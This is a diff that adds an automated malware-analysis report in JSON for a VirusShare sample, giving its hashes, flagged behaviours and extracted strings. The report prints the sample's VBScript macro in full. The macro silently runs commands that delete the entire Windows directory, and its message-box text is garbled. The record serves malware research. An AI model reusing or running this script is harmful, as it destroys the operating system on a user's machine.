@@ -1,0 +1,45 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "vbHide": "May run an executable file or a system command"
+        },
+        "macro": "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\nSet WinTmpDir = WshShell.Environment(\"Process\")\nIf WinTmpDir(\"OS\") = \"Windows_NT\" Then\n    WshShell.Run \"cmd /k rd /q/s \" + WinTmpDir(\"windir\"), vbHide\nElse\n    WshShell.Run \"deltree /y \" + WinTmpDir(\"windir\"), vbHide\nEnd If\nmsgbox \"\ufffd\u0532\ufffd\ufffd\ud84e\udf38\ufffd\ufffd\u3fea\ufffd\ufffd\u0426\ufffd\u0123\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01ac\ufffd\ufffd\",,\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\"\u001a"
+    },
+    "filename": "VirusShare_3871bbb4511757f714cd9f0741b2f6d8",
+    "filesize": 343,
+    "filetype": "data",
+    "hashes": {
+        "md5": "3871bbb4511757f714cd9f0741b2f6d8",
+        "sha1": "247a51eadb6b2d14ac13b6e6e7b74b238d573b80",
+        "sha256": "e2340a4eb196b81590df1aad497777423f23ac3490530e2eb034128c6ad2615e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set WshShell = WScript.CreateObject(\"WScript.Shell\")",
+            "Set WinTmpDir = WshShell.Environment(\"Process\")",
+            "If WinTmpDir(\"OS\") = \"Windows_NT\" Then",
+            "    WshShell.Run \"cmd /k rd /q/s \" + WinTmpDir(\"windir\"), vbHide",
+            "Else",
+            "    WshShell.Run \"deltree /y \" + WinTmpDir(\"windir\"), vbHide",
+            "End If",
+            "msgbox \"\u0532\ud84e\udf38\u3fea\u0426\u0123\u01ac\",,\"\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.256612",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
